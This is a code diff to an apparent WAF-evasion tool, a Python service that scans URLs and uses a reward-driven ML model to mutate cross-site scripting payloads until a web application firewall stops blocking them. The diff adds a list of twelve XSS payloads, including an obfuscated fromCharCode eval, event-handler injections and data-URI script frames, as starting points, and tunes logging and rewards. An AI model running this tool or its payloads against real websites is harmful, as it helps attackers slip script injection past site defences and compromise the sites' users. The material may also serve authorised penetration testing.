@@ -6,6 +6,7 @@ Orchestrates all components using dependency injection
 from typing import List, Optional, Dict, Any
 import time
 import random
+import logging
 from concurrent.futures import ThreadPoolExecutor
 from tqdm import tqdm
 
@@ -36,7 +37,7 @@ class WAFBypassService(IWAFBypassService):
         self.error_handler: IErrorHandler = container.resolve(IErrorHandler)
 
         # Service configuration
-        self.max_attempts = 100
+        self.max_attempts = 50
         self.min_delay = 1.0
         self.max_delay = 5.0
 
@@ -107,9 +108,27 @@ class WAFBypassService(IWAFBypassService):
         Returns:
             True if any attempt succeeded
         """
-        # Initial safe payload
-        initial_payload = "<img src=x>"
+        # Start with truly malicious payloads that should definitely be blocked
+        malicious_payloads = [
+            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+            "<img src=x onerror=\"javascript:alert('XSS')\">",
+            "<svg onload=\"javascript:alert('XSS')\">",
+            "<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
+            "<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>",
+            "<embed src=\"data:text/html,<script>alert('XSS')</script>\">",
+            "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>alert('XSS')</script>\">",
+            "<link rel=\"import\" href=\"data:text/html,<script>alert('XSS')</script>\">",
+            "<form action=\"javascript:alert('XSS')\"><input type=\"submit\"></form>",
+            "<a href=\"javascript:alert('XSS')\">Click me</a>",
+            "<div onmouseover=\"javascript:alert('XSS')\">Hover me</div>",
+            "<input type=\"text\" onfocus=\"javascript:alert('XSS')\">",
+        ]
+
+        # Pick a random malicious payload to start with
+        initial_payload = random.choice(malicious_payloads)
         payload = self.input_validator.validate_payload(initial_payload)[1]
+
+        self.logger.info(f"Starting with malicious payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")
 
         for attempt in range(self.max_attempts):
             try:
@@ -141,6 +160,7 @@ class WAFBypassService(IWAFBypassService):
             except Exception as e:
                 self.logger.warning(f"Attempt {attempt + 1} failed: {e}")
                 # Penalize failed attempts
+                self.logger.info(f"ML PENALTY: Calling update with failure reward -1")
                 self.ml_model.update(payload, -1)
 
         return False
@@ -148,11 +168,11 @@ class WAFBypassService(IWAFBypassService):
     def _calculate_reward(self, response) -> int:
         """Calculate reward based on response"""
         if response.status_code in [200, 201, 202, 301, 302, 404, 500]:
-            return 1
+            return 1  # Payload executed successfully (could indicate bypass or no WAF)
         elif response.status_code in [403, 406, 429]:
-            return -1
+            return -1  # Blocked by WAF
         else:
-            return 0
+            return 0  # Other status codes - neutral
 
     def scan_urls(self, urls: List[str], workers: int = 3, detect_only: bool = False) -> Dict[str, Any]:
         """
@@ -179,10 +199,15 @@ class WAFBypassService(IWAFBypassService):
                     url, has_waf, error = future.result()
                     if error:
                         results["errors"].append(url)
+                        self.stats["errors"] += 1
                     elif has_waf:
                         results["detected"].append(url)
+                        self.stats["waf_detected"] += 1
                     else:
                         results["not_detected"].append(url)
+
+                # Update total URLs processed for detection-only mode
+                self.stats["total_urls_processed"] += len(urls)
             else:
                 self.logger.info("Running full WAF bypass attempts")
                 futures = [executor.submit(self.evade_waf, url) for url in urls]
